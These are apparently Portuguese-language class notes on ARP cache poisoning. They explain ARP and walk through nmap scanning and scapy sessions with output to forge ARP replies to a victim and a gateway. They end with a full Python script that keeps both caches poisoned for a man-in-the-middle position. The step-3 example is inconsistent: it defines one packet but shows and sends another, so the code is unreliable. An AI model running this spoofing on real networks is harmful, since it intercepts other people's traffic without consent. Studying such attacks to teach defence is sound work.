# ARP Cache Poisoning
---
### Relembrando o protocolo ARP

**1. O que é**

Vimos há algumas aulas sobre o protocolo ARP e como ele funciona, mas aqui vai um breve resumo para relembrá-lo. O Address Resolution Protocol (ARP) é responsável por fazer a ligação da camada de rede com a de enlace, mapeando um endereço de rede (como um IPv4) a um endereço Ethernet (como um MAC), permitindo a existência de redes com múltiplos acessos.

**2. ARP Cache**

Os hosts da rede mantêm uma tabela que mapeia um endereço IP a um endereço MAC em cada linha (temporária), que é preenchida quando acontece uma resolução de um IP que não consta na ARP cache. Com esse mapeamento, enquanto houver comunicação entre dois hosts, não é necessário fazer novas resoluções de IP através de ARP requests.

<!-- ARP Broadcast w/ caption -->
![](imgs/arp_broadcast.png)
<span style="color:grey">Nesse caso, a ARP Cache do Host A possui a linha do IP do Host C preenchida com o MAC dele, então é possível estabelecer uma conexão direta de A para C sem que haja um novo ARP request.</span>


### Ataque Man In the Middle (MITM)

A ideia do ataque é simples: o invasor se posiciona entre as duas pontas de uma comunicação, interceptando as mensagens trocadas. Na prática, no entanto, é algo um pouco mais complexo, pois para funcionar direito, o atacante não pode ser detectado.

![](imgs/mitm.png)

### Sobre o ataque

**1. Objetivo**

O objetivo desse ataque é "envenenar" a arp cache, tanto da vítima quanto do gateway padrão (dentro de uma rede), escrevendo informações falsas nelas e fazendo com que o atacante finja ser o gateway para a vítima e vice-versa (um MITM). O invasor, então, encaminha os dados para os devidos endereços, tornando uma comunicação completa, porém agora tudo passa por ele, o que cria uma abertura para outros tipos de ataque.

**2. Como funciona**

Antes de fazer o ataque em si, o invasor precisa conhecer os IPs da vítima e do gateway e, para isso, ele faz um scan na rede e identifica esses dados.

Com isso em mãos, o atacante realiza broadcasts para descobrir os respectivos MACs daqueles IPs e, no momento em que as ARP caches forem atualizadas, ele irá mandar um "replies safados", sobrepondo os MACs do gateway e da vítima com o seu no lugar.

Nesse momento, as comunicações serão entre gateway e invasor e entre vítima e invasor. Para se manter em anonimato, o invasor redireciona os pacotes que recebe, fechando a comunicação original.

### O ataque na prática

Para realizar o ataque, usaremos duas ferramentas, principalmente: o nmap e o scapy

**Nmap**

Falaremos melhor em aulas futuras, mas, resumidamente, é um programa que realiza port scan, descobrindo hosts e serviços em uma rede.

**Scapy**

Scapy é uma ferramenta que permite ao usuário enviar, sniffar, dissecar e forjar pacotes.

**1. Instalação**

```bash
$ git clone https://github.com/secdev/scapy.git
$ cd scapy
$ sudo python3 setup.py install
```
ou
```bash 
$ sudo apt install python3-scapy
```

**O ataque**
* Passo 0: identificar hosts (vítimas) na rede

```bash
$ sudo nmap 192.168.1.0/24 -sC
```

Supondo que o atacante tenha achado o host ```192.168.1.101```
* Iniciando o Scapy

```bash
$ scapy
```

* 1º passo: Identificar o MAC Address da vítima e do default * gateway
* Solução: arp request e arp reply
* Default gateway:

```bash
>>> arprequest1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst = "192.168.1.1")
>>> arprequest1.show()
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 28:56:5a:49:ff:67
  type= ARP
###[ ARP ]### 
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 28:56:5a:49:ff:67
     psrc= 192.168.1.103
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.1

>>> arpreply1 = srp(arprequest1)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> arpreply1[0][0][1]
(<<Ether  dst=28:56:5a:49:ff:67 src=c4:e9:84:9a:14:16 type=ARP |<ARP
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=c4:e9:84:9a:14:16
psrc=192.168.1.1 hwdst=28:56:5a:49:ff:67 pdst=192.168.1.103 |>>)
```

Observe que o arp request faz um broadcast (```dst=ff:ff:ff:ff:ff:ff:ff```), carrega a operação 1 (```who-has```), com o hwdst (MAC address de destino) desconhecido e o ```pdst``` (IP de destino ) ```192.168.1```. Ou seja, quando enviado com o ```srp``` pergunta à todos qual é o MAC do ```192.168.1.1``` e aguarda uma resposta.

O gateway recebe essa request e envia uma reply que chega como retorno do ```srp``` (arpreply1). É possível perceber que o ```arpreply1``` carrega a operação 2 (is-at) e tem como ```hwsrc``` (MAC Address de onde saiu) ```c4:e9:84:9a:14:16```, que é justamente o MAC do gateway que queríamos.

* Vítima
```bash
>>> arprequest2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst = "192.168.1.101")
>>> arprequest2.show()
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 28:56:5a:49:ff:67
  type= ARP
###[ ARP ]### 
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 28:56:5a:49:ff:67
     psrc= 192.168.1.103
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.101

>>> arpreply2 = srp(arprequest2)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> arpreply2[0][0][1]
(<<Ether  dst=28:56:5a:49:ff:67 src=c4:e9:84:9a:14:16 type=ARP |<ARP
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=b4:2e:99:f4:b7:df
psrc=192.168.1.1 hwdst=28:56:5a:49:ff:67 pdst=192.168.1.103 |>>)
```

A mesma observação feita para o gateway vale para a vítima.
* 2º passo: “envenenar” o arp cache da vítima na linha do default gateway, preenchendo com o MAC address do atacante
* Solução: fake arp reply

```bash
>>> arppoison1 = ARP(op = 2, psrc = "192.168.1.1", pdst = "192.168.1.101", hwdst = "b4:2e:99:f4:b7:df")
>>> arppoison1.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= is-at
  hwsrc= 28:56:5a:49:ff:67
  psrc= 192.168.1.1
  hwdst= b4:2e:99:f4:b7:df
  pdst= 192.168.1.101

>>> send(arppoison1)
.
Sent 1 packets.
```

Observe que o que está sendo enviado para a vítima (```192.168.1.101``` no MAC ```b4:2e:99:f4:b7:df```) é que o IP ```192.168.1.1``` (default gateway) está (```is-at```) no MAC ```28:56:5a:49:ff:67``` (```hwsrc```) que na verdade é o MAC do atacante.
* 3º passo: “envenenar” o arp cache do default gateway na linha da vítima, preenchendo com o MAC address do atacante
* Solução: fake arp reply

```bash
>>> arppoison2 = ARP(op = 2, psrc = "192.168.1.101", pdst = "192.168.1.1", hwdst = "c4:e9:84:9a:14:16")
>>> arppoison1.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= is-at
  hwsrc= 28:56:5a:49:ff:67
  psrc= 192.168.1.101
  hwdst= c4:e9:84:9a:14:16
  pdst= 192.168.1.1

>>> send(arppoison1)
.
Sent 1 packets.
```

Observe agora que o que está sendo enviado para o gateway (```192.168.1.1``` no MAC ```c4:e9:84:9a:14:16```) é que o IP ```192.168.1.101``` (vítima) está (```is-at```) no MAC ```28:56:5a:49:ff:67``` (```hwsrc```) que na verdade é o MAC do atacante.

A partir desse momento, o gateway acha que a vítima está no MAC do atacante assim como a vítima acha que o gateway está no mesmo MAC malicioso.

---

### Problemas

Porém, só com isso, esse ataque ainda não é efetivo por 2 motivos:

* Os pacotes saem do gateway e chegam no atacante, mas não vão até a vítima, assim como saem da vítima e chegam no atacante, mas não vão pro gateway. É preciso fazer com que o atacante encaminhe os pacotes para o iP certo quando passam por ele.

* A arp cache possui um tempo de verificação de linhas obsoletas, fazendo novos arp requests para atualizá-la. Após o ataque ser feito uma vez, depois de um curto período de tempo, a cache voltaria ao normal.

---

### Soluções

1. Para encaminhar pacotes para os devidos IP's exitem 2 maneiras:

Pelo próprio kernel

```bash
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```
ou

Utilizando o iptables

```bash
sudo apt install iptables
```

1. Para burlar o refresh da arp cache, o atacante pode enviar continuamente fake replys para sempre que um request for feito, já haja um fakereply pronto para responder. E isso pode ser feito com um script em python.

```python
from scapy.all import *
import time

def getmac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket)[0][0][1].hwsrc
    return targetmac

def poisonarpcache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet)
    print ("ARP Table restored to normal for", targetip)

def main():
    targetip = input("Enter Target IP:")
    gatewayip = input("Enter Gateway IP:")

    try:
        targetmac = getmac(targetip)
    except:
         print("Target machine did not respond to ARP broadcast")
         quit()

    try:
        gatewaymac= getmac(gatewayip)
    except:
         print("Gateway is unreachable")
         quit()

    try:
        print ("Sending spoofed ARP replies")
        while True:
            time.sleep(5) 
            poisonarpcache(targetip, targetmac, gatewayip)
            poisonarpcache(gatewayip, gatewaymac, targetip)

    except KeyboardInterrupt:
        print ("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
```
---
### Referências
1. <a href="https://web.archive.org/web/20041204044506/http://www.ietf.org/rfc/rfc826.txt">RFC 826</a>
2. <a href="https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112">ARP Cache Poisoning using Scapy​</a>
3. <a href="https://scapy.readthedocs.io/en/latest/usage.html">Scapy Documentation</a>